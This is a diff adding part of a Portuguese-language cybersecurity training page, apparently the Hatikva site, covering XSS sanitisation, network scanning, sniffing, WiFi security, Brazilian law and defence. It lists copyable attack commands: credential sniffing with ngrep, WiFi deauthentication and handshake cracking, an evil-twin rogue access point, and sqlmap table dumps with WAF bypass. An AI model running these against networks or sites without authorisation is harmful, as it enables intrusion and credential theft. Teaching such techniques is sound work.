+});<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Sanitização de Input</h3>
+                        <div class="success-box">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <strong>Regras de Sanitização:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li><strong>Escape especial characters:</strong> &lt; &gt; &amp; " ' /</li>
+                                    <li><strong>Validate input:</strong> Tipo, tamanho, formato</li>
+                                    <li><strong>Use libraries:</strong> DOMPurify, OWASP Java Encoder</li>
+                                    <li><strong>Context matters:</strong> HTML, CSS, JavaScript, URL</li>
+                                    <li><strong>Never trust user input!</strong></li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <h3>Exemplos de Código Seguro</h3>
+                        <pre class="code-block">// PHP com htmlspecialchars
+echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
+
+// Node.js com xss-filters
+const xssFilters = require('xss-filters');
+app.get('/', (req, res) => {
+    res.send(xssFilters.inHTMLData(req.query.input));
+});
+
+// Python com bleach
+import bleach
+clean = bleach.clean(user_input, tags=[], attributes={})<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- NETWORK -->
+                <div id="section-network" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-network-wired me-3"></i>Análise de Rede</h1>
+
+                        <div class="info-box">
+                            <i class="fas fa-info-circle fa-2x"></i>
+                            <div>
+                                <strong>Análise de rede</strong> envolve descobrir hosts, serviços, vulnerabilidades e configurar defesas. Fundamental para segurança ofensiva e defensiva.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-search me-2"></i>Enumeração de Hosts</h2>
+
+                        <h3>Ping Sweep</h3>
+                        <pre class="code-block"># Nmap ping scan
+nmap -sn 192.168.1.0/24
+
+# fping (mais rápido)
+fping -a -g 192.168.1.0/24 2>/dev/null
+
+# ping em bash
+for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from" & done
+
+# arp-scan
+sudo arp-scan -l
+
+# netdiscover
+sudo netdiscover -r 192.168.1.0/24<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>DNS Enumeration</h3>
+                        <pre class="code-block"># Zone transfer test
+dig @ns1.example.com example.com AXFR
+
+# Query DNS records
+dig example.com ANY
+dig example.com MX
+dig example.com TXT
+dig example.com NS
+
+# Reverse DNS
+for i in {1..254}; do dig -x 192.168.1.$i +short; done
+
+# dnsrecon
+dnsrecon -d example.com<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-door-open me-2"></i>Scanning de Portas</h2>
+
+                        <h3>Nmap - Scan Básico</h3>
+                        <pre class="code-block"># TCP SYN scan (stealth)
+nmap -sS 192.168.1.1
+
+# TCP connect scan
+nmap -sT 192.168.1.1
+
+# UDP scan
+nmap -sU 192.168.1.1
+
+# Scan de portas específicas
+nmap -p 80,443,22,21 192.168.1.1
+
+# Scan de range
+nmap -p1-1000 192.168.1.1
+
+# Scan de todas as portas
+nmap -p- 192.168.1.1<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Nmap - Scan Avançado</h3>
+                        <pre class="code-block"># Version detection
+nmap -sV 192.168.1.1
+
+# OS detection
+nmap -O 192.168.1.1
+
+# Script scanning
+nmap -sC 192.168.1.1
+nmap --script vuln 192.168.1.1
+nmap --script http-enum 192.168.1.1
+
+# Aggressive scan
+nmap -A -T4 192.168.1.1
+
+# Timing templates
+nmap -T0 (Paranoid)
+nmap -T1 (Sneaky)
+nmap -T2 (Polite)
+nmap -T3 (Normal)
+nmap -T4 (Aggressive)
+nmap -T5 (Insane)<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Masscan - Scan Rápido</h3>
+                        <pre class="code-block"># Scan rápido
+masscan 192.168.1.0/24 -p80,443,22,21
+
+# Rate limit alto
+masscan 0.0.0.0/0 -p80 --rate=100000
+
+# Output em formato nmap
+masscan 192.168.1.0/24 -p1-65535 -oX scan.xml
+
+# Banner grabbing
+masscan 192.168.1.1 -p80 --banners<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-eye me-2"></i>Packet Sniffing</h2>
+
+                        <h3>tcpdump</h3>
+                        <pre class="code-block"># Capturar todos os pacotes
+sudo tcpdump -i eth0
+
+# Capturar para arquivo
+sudo tcpdump -i eth0 -w capture.pcap
+
+# Filtrar por host
+sudo tcpdump -i eth0 host 192.168.1.1
+
+# Filtrar por porta
+sudo tcpdump -i eth0 port 80
+
+# Filtrar por protocolo
+sudo tcpdump -i eth0 icmp
+sudo tcpdump -i eth0 tcp
+sudo tcpdump -i eth0 udp
+
+# Mostrar em ASCII
+sudo tcpdump -i eth0 -A
+
+# Mostrar em hex
+sudo tcpdump -i eth0 -XX<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Wireshark/tshark</h3>
+                        <pre class="code-block"># tshark (CLI)
+sudo tshark -i eth0
+sudo tshark -r capture.pcap
+sudo tshark -i eth0 -Y "http.request"
+
+# Filtros comuns
+ip.addr == 192.168.1.1
+tcp.port == 80
+http.request.method == "GET"
+dns.qry.name contains "google"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>ngrep</h3>
+                        <pre class="code-block"># Filtrar por string
+sudo ngrep -q "password" port 80
+sudo ngrep -i "login" host 192.168.1.1
+
+# Capturar credenciais
+sudo ngrep -i "user|pass|login|auth" port 80
+
+# Regex
+sudo ngrep "^GET|^POST" port 80<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-project-diagram me-2"></i>Network Mapping</h2>
+
+                        <h3>Network Topology</h3>
+                        <pre class="code-block"># traceroute
+traceroute google.com
+traceroute -I google.com  # ICMP
+traceroute -T google.com  # TCP
+
+# mtr (combina ping + traceroute)
+mtr google.com
+mtr --report google.com
+
+# Discover hosts
+netdiscover -r 192.168.1.0/24<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Service Enumeration</h3>
+                        <pre class="code-block"># Banner grabbing
+nc 192.168.1.1 80
+echo "" | nc 192.168.1.1 22
+
+# SNMP enumeration
+snmpwalk -c public -v1 192.168.1.1
+snmp-check 192.168.1.1 -c public
+
+# SMB enumeration
+enum4linux 192.168.1.1
+smbclient -L //192.168.1.1<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-shield-alt me-2"></i>Network Defense</h2>
+
+                        <h3>Firewall (UFW)</h3>
+                        <pre class="code-block"># Instalar e habilitar
+sudo apt install ufw
+sudo ufw enable
+
+# Regras básicas
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+
+# Permitir serviços
+sudo ufw allow 22/tcp    # SSH
+sudo ufw allow 80/tcp    # HTTP
+sudo ufw allow 443/tcp   # HTTPS
+
+# Permitir por IP
+sudo ufw allow from 192.168.1.100 to any port 22
+
+# Listar regras
+sudo ufw status verbose
+sudo ufw status numbered
+
+# Remover regra
+sudo ufw delete 2<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Fail2Ban</h3>
+                        <pre class="code-block"># Instalar
+sudo apt install fail2ban
+
+# Configurar
+sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+
+# Editar /etc/fail2ban/jail.local
+[sshd]
+enabled = true
+port = ssh
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+
+# Reiniciar
+sudo systemctl restart fail2ban
+sudo systemctl enable fail2ban
+
+# Status
+sudo fail2ban-client status
+sudo fail2ban-client status sshd<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Network Monitoring</h3>
+                        <pre class="code-block"># Monitorar conexões
+sudo netstat -tulpn
+sudo ss -tulpn
+
+# Monitorar tráfego
+sudo iftop -i eth0
+sudo nethogs eth0
+
+# IPTables logging
+sudo iptables -A INPUT -p tcp --dport 22 -j LOG --log-prefix "SSH Attempt: "<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="success-box">
+                            <i class="fas fa-lightbulb"></i>
+                            <div>
+                                <strong>Dicas de Segurança de Rede:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Use VPN para acesso remoto</li>
+                                    <li>Implemente segmentation de rede</li>
+                                    <li>Monitore logs regularmente</li>
+                                    <li>Atualize firmwares de dispositivos</li>
+                                    <li>Use IDS/IPS (Snort, Suricata)</li>
+                                    <li>Desative serviços não utilizados</li>
+                                    <li>Implemente NAC (Network Access Control)</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- WIRELESS -->
+                <div id="section-wireless" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-wifi me-3"></i>Wireless Security</h1>
+
+                        <div class="info-box">
+                            <i class="fas fa-info-circle fa-2x"></i>
+                            <div>
+                                <strong>Segurança Wireless</strong> envolve auditoria de redes WiFi, identificação de vulnerabilidades e proteção contra ataques. Requer hardware compatível e conhecimento técnico.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-wrench me-2"></i>Preparação do Ambiente</h2>
+
+                        <h3>Hardware Recomendado</h3>
+                        <div class="tool-card">
+                            <div class="tool-name">Adaptadores WiFi Compatíveis</div>
+                            <ul>
+                                <li><strong>Alfa AWUS036ACH</strong> - Dual band, suporte a monitor mode</li>
+                                <li><strong>TP-Link TL-WN722N</strong> - Barato, bom para iniciantes</li>
+                                <li><strong>Panda PAU06</strong> - Suporte a 5GHz</li>
+                                <li><strong>Raspberry Pi + Alfa</strong> - Pentest móvel</li>
+                            </ul>
+                        </div>
+
+                        <h3>Verificar Compatibilidade</h3>
+                        <pre class="code-block"># Verificar interfaces wireless
+iwconfig
+ip link show
+
+# Verificar chipsets
+lsusb
+lspci
+
+# Verificar suporte a monitor mode
+sudo airmon-ng
+sudo iw phy<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Configurar Interface</h3>
+                        <pre class="code-block"># Parar processos que interferem
+sudo airmon-ng check kill
+
+# Colocar em modo monitor
+sudo airmon-ng start wlan0
+
+# Verificar modo monitor
+iwconfig
+# Deve mostrar: Mode:Monitor
+
+# Mudar canal
+sudo iwconfig wlan0mon channel 6
+sudo iwconfig wlan0mon freq 2.437G<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-search me-2"></i>Reconhecimento</h2>
+
+                        <h3>Escanear Redes</h3>
+                        <pre class="code-block"># Escanear todas as redes
+sudo airodump-ng wlan0mon
+
+# Escanear canal específico
+sudo airodump-ng wlan0mon -c 6
+
+# Escanear com output
+sudo airodump-ng wlan0mon -w scan --output-format csv,pcap
+
+# Escanear rede específica
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Informações das Redes</h3>
+                        <pre class="code-block"># BSSID: MAC do access point
+# ESSID: Nome da rede (SSID)
+# Channel: Canal (1-11 2.4GHz, 36-165 5GHz)
+# Encryption: WEP, WPA, WPA2, WPA3, OPN
+# Clients: Dispositivos conectados
+# Power: Sinal (quanto menor, melhor)
+
+# Para rede específica:
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-unlock me-2"></i>Ataques WEP</h2>
+
+                        <div class="warning-box">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <div>
+                                <strong>WEP está obsoleto</strong> e pode ser quebrado em minutos. Apenas para fins educacionais em laboratórios controlados.
+                            </div>
+                        </div>
+
+                        <h3>Ataque ARP Request Replay</h3>
+                        <pre class="code-block"># Passo 1: Capturar IVs
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
+
+# Passo 2: Injetar pacotes ARP
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC wlan0mon
+
+# Passo 3: Crackear com IVs coletados
+sudo aircrack-ng wep_capture.cap
+
+# Alternativa: Ataque fake authentication
+sudo aireplay-ng -1 0 -e "SSID" -a AA:BB:CC:DD:EE:FF -h CLIENT_MAC wlan0mon<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-lock me-2"></i>Ataques WPA/WPA2</h2>
+
+                        <h3>Capturar Handshake</h3>
+                        <pre class="code-block"># Passo 1: Monitorar rede
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
+
+# Passo 2: Deauthentication attack
+# Esperar cliente aparecer no airodump
+sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+
+# Passo 3: Verificar handshake capturado
+# No airodump, procurar: "WPA handshake: AA:BB:CC:DD:EE:FF"
+
+# Passo 4: Crackear
+sudo aircrack-ng -w wordlist.txt handshake.cap<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>PMKID Attack (sem cliente)</h3>
+                        <pre class="code-block"># Usar hcxdumptool
+sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+
+# Capturar PMKID
+# Parar quando aparecer: "PMKID(s) written to ..."
+
+# Converter para hashcat
+hcxpcaptool -z hash.hc22000 pmkid.pcapng
+
+# Crackear com hashcat
+hashcat -m 22000 hash.hc22000 wordlist.txt<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-broadcast-tower me-2"></i>Rogue Access Point</h2>
+
+                        <h3>Criar AP Falso</h3>
+                        <pre class="code-block"># Usar airbase-ng
+sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon
+
+# Configurar interface
+sudo ifconfig at0 up
+sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
+
+# Configurar DHCP
+sudo dnsmasq -C /etc/dnsmasq.conf -d
+
+# Configurar NAT
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
+sudo iptables -A FORWARD -i eth0 -o at0 -j ACCEPT
+
+# Capturar credenciais
+sudo tcpdump -i at0 -w credentials.pcap<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Evil Twin Attack</h3>
+                        <pre class="code-block"># 1. Criar AP com mesmo nome da rede legítima
+# 2. Usar canal diferente (mais forte)
+# 3. Forçar deauth dos clientes legítimos
+# 4. Capturar handshakes quando reconectarem
+
+sudo aireplay-ng -0 0 -a LEGIT_BSSID wlan0mon
+sudo airbase-ng -e "Legit Network" -c 1 wlan0mon<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-tools me-2"></i>Ferramentas Automatizadas</h2>
+
+                        <h3>Wifite</h3>
+                        <pre class="code-block"># Scan e ataque automático
+sudo wifite
+
+# Opções específicas
+sudo wifite --wpa          # Apenas WPA
+sudo wifite --wep          # Apenas WEP
+sudo wifite --kill         # Matar processos
+sudo wifite --showb        # Apenas mostrar redes
+sudo wifite --crack        # Crackear handshakes existentes<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Fern WiFi Cracker</h3>
+                        <pre class="code-block"># Interface gráfica
+sudo fern-wifi-cracker
+
+# Funcionalidades:
+# - Auto detection de redes
+# - Wordlist attacks
+# - WEP cracking
+# - WPA cracking
+# - Session hijacking<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Kismet</h3>
+                        <pre class="code-block"># Detector de redes wireless
+sudo kismet
+
+# Features:
+# - Detecção de redes ocultas
+# - GPS mapping
+# - Packet capture
+# - IDS capabilities
+# - Logging extensivo<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2><i class="fas fa-shield-alt me-2"></i>Proteção Wireless</h2>
+
+                        <h3>Melhores Práticas</h3>
+                        <div class="success-box">
+                            <i class="fas fa-check-circle"></i>
+                            <div>
+                                <strong>Como Proteger sua Rede WiFi:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li><strong>Use WPA3</strong> (ou WPA2 com AES-CCMP)</li>
+                                    <li><strong>Senha forte</strong> (mínimo 16 caracteres complexos)</li>
+                                    <li><strong>Desative WPS</strong> (vulnerável a brute force)</li>
+                                    <li><strong>Use MAC filtering</strong> (ajuda, mas não é suficiente)</li>
+                                    <li><strong>Desative SSID broadcast</strong> (segurança por obscuridade)</li>
+                                    <li><strong>Atualize firmware</strong> do roteador regularmente</li>
+                                    <li><strong>Use VLANs</strong> para segmentar rede</li>
+                                    <li><strong>Monitore logs</strong> de autenticação</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <h3>Configurações Seguras</h3>
+                        <pre class="code-block"># No roteador:
+# 1. WPA2/WPA3 Personal com AES
+# 2. Senha: Mínimo 16 caracteres (letras, números, símbolos)
+# 3. Desativar: WPS, UPnP, Remote Management
+# 4. Alterar: Senha admin, SSID padrão
+# 5. Filtrar MAC addresses conhecidos
+# 6. Usar firewall do roteador
+# 7. Logar tentativas de acesso
+# 8. Atualizar firmware regularmente<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>Monitoramento</h3>
+                        <pre class="code-block"># Verificar clientes conectados
+arp -a
+sudo nmap -sn 192.168.1.0/24
+
+# Monitorar tráfego
+sudo tcpdump -i wlan0 -n not port 22
+
+# Detectar rogue APs
+sudo airodump-ng wlan0mon | grep -E "(OPN|WEP)"<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="warning-box">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <div>
+                                <strong>Aviso Legal:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Teste apenas redes que você possui</li>
+                                    <li>Obtenha autorização por escrito</li>
+                                    <li>WiFi hacking é crime em muitos países</li>
+                                    <li>Use em ambientes controlados/laboratórios</li>
+                                    <li>Documente tudo para fins educacionais</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- As seções LEGAL, DEFENSE, e CHEATSHEET permanecem iguais -->
+                <!-- LEGAL -->
+                <div id="section-legal" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-balance-scale me-3"></i>Aspectos Legais</h1>
+
+                        <div class="disclaimer">
+                            <i class="fas fa-gavel fa-2x"></i>
+                            <div>
+                                <strong>AVISO CRÍTICO:</strong> Este conteúdo é educacional. Todas as técnicas devem ser usadas APENAS em sistemas que você possui ou tem autorização explícita.
+                            </div>
+                        </div>
+
+                        <h2><i class="fas fa-landmark me-2"></i>Legislação Brasileira</h2>
+
+                        <h3>Lei Carolina Dieckmann (Lei 12.737/2012)</h3>
+                        <p>Criminaliza invasão de dispositivos informáticos:</p>
+                        <ul>
+                            <li><strong>Artigo 154-A:</strong> Invasão de dispositivo informático - pena de 3 meses a 1 ano + multa</li>
+                            <li><strong>Agravantes:</strong> Obtenção de dados, vantagem ilícita ou prejuízo - pena aumenta para 6 meses a 2 anos</li>
+                        </ul>
+
+                        <h3>Marco Civil da Internet (Lei 12.965/2014)</h3>
+                        <p>Estabelece direitos e deveres no uso da internet no Brasil.</p>
+
+                        <h3>LGPD (Lei 13.709/2018)</h3>
+                        <p>Lei Geral de Proteção de Dados - regulamenta tratamento de dados pessoais.</p>
+
+                        <h2 class="mt-4"><i class="fas fa-check-circle me-2"></i>Uso Ético</h2>
+                        <div class="success-box">
+                            <i class="fas fa-shield-alt fa-2x"></i>
+                            <div>
+                                <strong>Práticas Legais:</strong>
+                                <ul class="mb-0 mt-2">
+                                    <li>Testar apenas seus próprios sistemas</li>
+                                    <li>Obter autorização por escrito antes de pentests</li>
+                                    <li>Usar em ambientes de laboratório (DVWA, HackTheBox, TryHackMe)</li>
+                                    <li>Participar de bug bounty programs autorizados</li>
+                                    <li>Estudar para certificações profissionais</li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <h2 class="mt-4"><i class="fas fa-certificate me-2"></i>Certificações</h2>
+                        <ul>
+                            <li><strong>CEH:</strong> Certified Ethical Hacker</li>
+                            <li><strong>OSCP:</strong> Offensive Security Certified Professional</li>
+                            <li><strong>CISSP:</strong> Certified Information Systems Security Professional</li>
+                            <li><strong>Security+:</strong> CompTIA Security+</li>
+                            <li><strong>GCIH:</strong> GIAC Certified Incident Handler</li>
+                        </ul>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- DEFENSE -->
+                <div id="section-defense" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-shield-alt me-3"></i>Segurança Defensiva</h1>
+
+                        <h2><i class="fas fa-lock me-2"></i>Melhores Práticas</h2>
+
+                        <h3>1. Senhas Fortes</h3>
+                        <ul>
+                            <li>Mínimo 16 caracteres</li>
+                            <li>Combinação de letras, números e símbolos</li>
+                            <li>Não reutilizar senhas</li>
+                            <li>Usar gerenciador de senhas (Bitwarden, KeePass)</li>
+                        </ul>
+
+                        <h3>2. Autenticação Multi-Fator (MFA)</h3>
+                        <ul>
+                            <li>Sempre ative 2FA quando disponível</li>
+                            <li>Prefira apps autenticadores (Google Authenticator, Authy)</li>
+                            <li>Evite SMS quando possível</li>
+                        </ul>
+
+                        <h3>3. Atualizações</h3>
+                        <ul>
+                            <li>Mantenha SO e softwares sempre atualizados</li>
+                            <li>Ative atualizações automáticas quando possível</li>
+                            <li>Priorize patches de segurança</li>
+                        </ul>
+
+                        <h3>4. Firewall</h3>
+                        <pre class="code-block"># Linux - UFW
+sudo ufw enable
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+sudo ufw allow 22/tcp  # SSH
+sudo ufw allow 80/tcp  # HTTP
+sudo ufw allow 443/tcp # HTTPS<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h3>5. Backups</h3>
+                        <ul>
+                            <li>Regra 3-2-1: 3 cópias, 2 mídias diferentes, 1 offsite</li>
+                            <li>Automatize backups</li>
+                            <li>Teste restaurações regularmente</li>
+                            <li>Criptografe backups sensíveis</li>
+                        </ul>
+
+                        <h3>6. Monitoramento</h3>
+                        <div class="tool-card">
+                            <div class="tool-name">Fail2Ban</div>
+                            <div class="tool-description">Protege contra brute force bannindo IPs</div>
+                            <pre class="code-block">sudo apt install fail2ban
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+                        </div>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+
+                <!-- CHEATSHEET -->
+                <div id="section-cheatsheet" class="section-hidden">
+                    <section class="content-card">
+                        <h1 class="content-title"><i class="fas fa-book-open me-3"></i>Cheat Sheets</h1>
+
+                        <h2><i class="fas fa-terminal me-2"></i>Comandos Linux Essenciais</h2>
+                        <pre class="code-block"># Navegação
+ls -la          # Listar arquivos
+cd /caminho     # Mudar diretório
+pwd             # Diretório atual
+
+# Arquivos
+cat file.txt    # Visualizar arquivo
+nano file.txt   # Editar arquivo
+rm file.txt     # Remover arquivo
+cp src dst      # Copiar
+mv src dst      # Mover/Renomear
+
+# Permissões
+chmod 755 file  # Alterar permissões
+chown user file # Alterar dono
+
+# Rede
+ifconfig        # Interfaces de rede
+ip addr show    # Endereços IP
+netstat -tulpn  # Portas abertas
+ping host       # Testar conectividade<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2 class="mt-4"><i class="fas fa-code me-2"></i>Git</h2>
+                        <pre class="code-block"># Básico
+git clone url
+git add .
+git commit -m "message"
+git push origin main
+git pull
+
+# Branches
+git branch
+git checkout -b new-branch
+git merge branch-name<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2 class="mt-4"><i class="fas fa-network-wired me-2"></i>Nmap</h2>
+                        <pre class="code-block"># Scans básicos
+nmap 192.168.1.1                    # Scan simples
+nmap -sS 192.168.1.1                # SYN scan (stealth)
+nmap -sT 192.168.1.1                # TCP connect scan
+nmap -sU 192.168.1.1                # UDP scan
+
+# Discovery
+nmap -sn 192.168.1.0/24             # Ping scan (descoberta)
+nmap -Pn 192.168.1.1                # Sem ping
+
+# Portas
+nmap -p 80,443 192.168.1.1          # Portas específicas
+nmap -p- 192.168.1.1                # Todas as portas
+nmap -p1-1000 192.168.1.1           # Range de portas
+
+# Detecção
+nmap -sV 192.168.1.1                # Versão de serviços
+nmap -O 192.168.1.1                 # Sistema operacional
+nmap -A 192.168.1.1                 # Agressivo (SO + versões + scripts)
+
+# Scripts
+nmap --script vuln 192.168.1.1      # Vulnerabilidades
+nmap --script http-enum 192.168.1.1 # Enumeração HTTP<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2 class="mt-4"><i class="fas fa-database me-2"></i>SQLMap</h2>
+                        <pre class="code-block"># Básico
+sqlmap -u "http://site.com/page?id=1"
+
+# Listar
+sqlmap -u "url" --dbs               # Bancos de dados
+sqlmap -u "url" -D db --tables      # Tabelas
+sqlmap -u "url" -D db -T users --columns  # Colunas
+sqlmap -u "url" -D db -T users --dump     # Dados
+
+# POST
+sqlmap -u "url" --data="user=admin&pass=admin"
+
+# Cookies
+sqlmap -u "url" --cookie="PHPSESSID=xyz"
+
+# Bypass WAF
+sqlmap -u "url" --random-agent --tamper=space2comment<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <h2 class="mt-4"><i class="fas fa-wifi me-2"></i>Aircrack-ng</h2>
+                        <pre class="code-block"># Modo monitor
+airmon-ng start wlan0
+
+# Captura
+airodump-ng wlan0mon
+
+# Captura específica
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauth
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack
+aircrack-ng -w wordlist.txt capture.cap<button class="copy-btn" onclick="copyCode(this)">Copiar</button></pre>
+
+                        <div class="d-flex justify-content-between mt-4">
+                            <button class="btn btn-outline-primary" onclick="navigateTo('home')">
+                                <i class="fas fa-arrow-left me-1"></i> Voltar
+                            </button>
+                        </div>
+                    </section>
+                </div>
+            </article>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-md-6 mb-3 mb-md-0">
+                    <h3 class="mb-2"><span class="hebrew-text">הַתִּקְוָה</span> - HATIKVA</h3>
+                    <p class="mb-2">Plataforma Completa de Segurança Cibernética</p>
+                    <p class="mb-2">Educação • Ética • Defesa</p>
+                    <p class="mb-0">✡ Que a proteção esteja com você. <span class="hebrew-text">שָׁלוֹם</span></p>
+                </div>
+                <div class="col-md-6 text-md-end">
+                    <p class="mb-3">&copy; 2025 Hatikva Security. Todos os direitos reservados.</p>
+                    <p class="mb-3">Uso estritamente educacional e autorizado.</p>
+                    <div>
+                        <a href="https://t.me/migalth" target="_blank" class="social-link">
+                            <i class="fab fa-telegram"></i> @migalth
+                        </a>
+                        <a href="https://github.com/Migalth" target="_blank" class="social-link">
+                            <i class="fab fa-github"></i> Migalth
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal fade" id="copyModal" tabindex="-1">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">
+                        <i class="fas fa-check-circle text-success me-2"></i> Código Copiado!
+                    </h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <p>O comando foi copiado para sua área de transferência.</p>
+                    <div class="warning-box">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <strong>Lembre-se:</strong> Use apenas em sistemas autorizados!
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">
+                        <i class="fas fa-thumbs-up me-1"></i> Entendido
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Navegação entre seções
+        function navigateTo(section) {
+            // Todas as seções disponíveis
+            const sections = [
+                'home', 'quickstart', 'tutorials', 'tools', 'defense', 'legal',
+                'termux', 'linux', 'osint', 'bruteforce', 'sql', 'xss',
+                'network', 'wireless', 'templates', 'cheatsheet'
+            ];
+
+            // Esconder todas as seções
+            sections.forEach(sec => {
+                const el = document.getElementById('section-' + sec);
+                if (el) el.classList.add('section-hidden');
+            });
+
+            // Mostrar seção selecionada
